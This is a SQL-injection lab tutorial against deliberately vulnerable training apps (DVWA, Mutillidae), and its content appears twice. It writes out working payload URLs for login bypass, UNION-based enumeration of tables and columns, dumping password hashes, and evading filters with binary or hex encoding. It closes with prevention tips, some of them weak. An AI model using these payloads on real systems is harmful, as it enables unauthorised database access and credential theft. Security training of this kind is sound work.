SQL injection is used to directly inject code into the database using forms

Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input. 
To avoid SQL injection flaws, developers need to:

See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  

-> Direct injection in the GET request.
  The GET request is less secured than the POST request. That's why, you could insert SQL requests directly into the URL.
  Example: 
  <meta IP>/mutillidae/index.php?page=user-info.php&username=admin&password=pwd' OR 1=1%23&user-info-php-submit-button=View+Account+Details
  Here, we see that the proposed password is "pwd' OR 1=1 #" because, we use URL encoding to transform "#" into interpretable character.
  More important, the SQL request is placed between "password=" and "%23". So, it is very easy to place requests here and test so many ones.
    password=[ Place your SQL request directly here ]%23&user-info-php-submit-button=View+Account+Details

-> Blind injection
  Sometime, the site gives no information if the SQL request is bad and only gives result if the request id good. That's why we speak about
    blind requests.
  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to low.
  Click on the "SQL Injection" menu and try [ pwd' OR 1=1 # ]
  Play with URL to find the number of column: http://ms/dvwa/vulnerabilities/sqli/?id=pwd' order by 2%23&Submit=Submit#
  Go to "SQL Injection (blind)" to  avoid having response except when the request is comprehensible by mySQL.
    Examples:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2,3 %23&Submit=Submit# is blind.
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2 %23&Submit=Submit# is blind.
  After, you can play with function().
    Example: <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select database(),version() %23&Submit=Submit# is blind.
  Retrieve the name of all tables:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select table_name,null from information_schema.tables 
      where table_schema='dvwa' %23&Submit=Submit#
    >>> you see a table named users.
  Retrieve the name of all columns of the table users:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select column_name,null from information_schema.columns where 
      table_schema='dvwa' %23&Submit=Submit#
    >>> you see a password column.
  Retrieve all passwords:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select password,null from users 
    >>> you see all passwords (hash MDA) for all users.
  Finally, search for theses hash to find clear password. The first one gives "password" :) !

-> Use escapment characters
  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
  If you try to inject data as above, the system gives now an error:
    <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd' OR 1=1 %23&Submit=Submit#
  Return on the login page and click on "View soruce" then find that line:
    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
  >>> there is no ' around the $id at the end of the line. /!\ This could be a idea to find vulnerabilities.
  So try without "'": <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd OR 1=1 %23&Submit=Submit#
  >>> the response seems to be slightly different: "Unknown column 'pwd' in 'where clause'".  
  Test with a number instead of pwd: <ms IP>/dvwa/vulnerabilities/sqli/?id=1 OR 1=1 %23&Submit=Submit#
  >>> you will see information
  Continue exploitation with  <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select 1,2 %23&Submit=Submit#
  >> content of table are displayed.

-> Use different encoding
  It is possible to encode special characters into the URL to bypass filters.
  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
  Suppose you want to type that URL: 
    <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select column_name,2 from information_schema.columns 
      where table_schema='dvwa' %23&Submit=Submit#
  Here, we have problem with the 'dvwa' string: impossible to let "'", impossible to use %23 (instead of "'"), impossible to use
    another character ("`"). Nothing works !!
  So, here, try to convert dvwa in binary using that site: https://www.rapidtables.com/convert/number/ascii-to-binary.html
    then use 01100100 01110110 01110111 01100001 into the url:
  That gives (with 0b before and without any space):
    <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select column_name,2 from information_schema.columns 
      where table_schema=0b01100100011101100111011101100001 %23&Submit=Submit#
  That works !!!!
  It will the same result with an hexa encoding (just place 0x before the hexa codes, example 0x64767761 for dvwa).

-> How to prevent yourself from SQL injection
  -Use real_escape_string() function in PHP code.
     Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
  -Use stripslashes() function in PHP code.
  -Use is_numeric() in PHP code to be sure the ID is numerical, not a string.
  -Use "'" around variable name in PHP. Example: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";  
  -Stop writing dynamic queries with string concatenation.
  -Prevent malicious SQL input from being included in executed queries.
  -Do not display SQL error to the client/user. Be blind !!

>@################################################################################################################################################
>@#                                                                                                                                              #
>@# [ SQL injection | Advanced ]                                                                                                                 #
>@#                                                                                                                                              #
>@# SQL injection is used to directly inject code and SQL requests into the database using forms or URL.                                         #
>@#                                                                                                                                              #
>@# Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input.  #
>@# To avoid SQL injection flaws, developers need to:                                                                                            #
>@#                                                                                                                                              #
>@#   -Stop writing dynamic queries with string concatenation.                                                                                   #
>@#   -Prevent malicious SQL input from being included in executed queries.                                                                      #
>@#                                                                                                                                              #
>@# See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html                                                #
>@# See: howto-0060-sql-injection-web-vulnerability.txt                                                                                          #
>@# See: howto-0100-prevention-web-vulnerability.txt                                                                                             #
>@# See: howto-1075-owasp-top-10.txt                                                                                                             #
>@# See: howto-1076-owasp-top-10-fr.txt                                                                                                          #
>@#                                                                                                                                              #
>@#----------------------------------------------------------------------------------------------------------------------------------------------- 
>@
>@-> Direct injection in the GET request.
>@  The GET request is less secured than the POST request. That's why, you could insert SQL requests directly into the URL.
>@  Example: 
>@  <meta IP>/mutillidae/index.php?page=user-info.php&username=admin&password=pwd' OR 1=1%23&user-info-php-submit-button=View+Account+Details
>@  Here, we see that the proposed password is "pwd' OR 1=1 #" because, we use URL encoding to transform "#" into interpretable character.
>@  More important, the SQL request is placed between "password=" and "%23". So, it is very easy to place requests here and test so many ones.
>@    password=[ Place your SQL request directly here ]%23&user-info-php-submit-button=View+Account+Details
>@
>@-> Blind injection
>@  Sometime, the site gives no information if the SQL request is bad and only gives result if the request id good. That's why we speak about
>@    blind requests.
>@  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to low.
>@  Click on the "SQL Injection" menu and try [ pwd' OR 1=1 # ]
>@  Play with URL to find the number of column: http://ms/dvwa/vulnerabilities/sqli/?id=pwd' order by 2%23&Submit=Submit#
>@  Go to "SQL Injection (blind)" to  avoid having response except when the request is comprehensible by mySQL.
>@    Examples:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2,3 %23&Submit=Submit# is blind.
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2 %23&Submit=Submit# is blind.
>@  After, you can play with function().
>@    Example: <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select database(),version() %23&Submit=Submit# is blind.
>@  Retrieve the name of all tables:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select table_name,null from information_schema.tables 
>@      where table_schema='dvwa' %23&Submit=Submit#
>@    >>> you see a table named users.
>@  Retrieve the name of all columns of the table users:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select column_name,null from information_schema.columns where 
>@      table_schema='dvwa' %23&Submit=Submit#
>@    >>> you see a password column.
>@  Retrieve all passwords:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select password,null from users 
>@    >>> you see all passwords (hash MDA) for all users.
>@  Finally, search for theses hash to find clear password. The first one gives "password" :) !
>@
>@-> Use escapment characters
>@  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
>@  If you try to inject data as above, the system gives now an error:
>@    <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd' OR 1=1 %23&Submit=Submit#
>@  Return on the login page and click on "View soruce" then find that line:
>@    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
>@  >>> there is no ' around the $id at the end of the line. /!\ This could be a idea to find vulnerabilities.
>@  So try without "'": <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd OR 1=1 %23&Submit=Submit#
>@  >>> the response seems to be slightly different: "Unknown column 'pwd' in 'where clause'".  
>@  Test with a number instead of pwd: <ms IP>/dvwa/vulnerabilities/sqli/?id=1 OR 1=1 %23&Submit=Submit#
>@  >>> you will see information
>@  Continue exploitation with  <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select 1,2 %23&Submit=Submit#
>@  >> content of table are displayed.
>@
>@-> Use different encoding
>@  It is possible to encode special characters into the URL to bypass filters.
>@  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
>@  Suppose you want to type that URL: 
>@    <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select column_name,2 from information_schema.columns 
>@      where table_schema='dvwa' %23&Submit=Submit#
>@  Here, we have problem with the 'dvwa' string: impossible to let "'", impossible to use %23 (instead of "'"), impossible to use
>@    another character ("`"). Nothing works !!
>@  So, here, try to convert dvwa in binary using that site: https://www.rapidtables.com/convert/number/ascii-to-binary.html
>@    then use 01100100 01110110 01110111 01100001 into the url:
>@  That gives (with 0b before and without any space):
>@    <ms IP>/dvwa/vulnerabilities/sqli/?id=1 union select column_name,2 from information_schema.columns 
>@      where table_schema=0b01100100011101100111011101100001 %23&Submit=Submit#
>@  That works !!!!
>@  It will the same result with an hexa encoding (just place 0x before the hexa codes, example 0x64767761 for dvwa).
>@
>@-> How to prevent yourself from SQL injection
>@  -Use real_escape_string() function in PHP code.
>@     Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
>@  -Use stripslashes() function in PHP code.
>@  -Use is_numeric() in PHP code to be sure the ID is numerical, not a string.
>@  -Use "'" around variable name in PHP. Example: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";  
>@  -Stop writing dynamic queries with string concatenation.
>@  -Prevent malicious SQL input from being included in executed queries.
>@  -Do not display SQL error to the client/user. Be blind !!
>@
>@################################################################################################################################################
>@
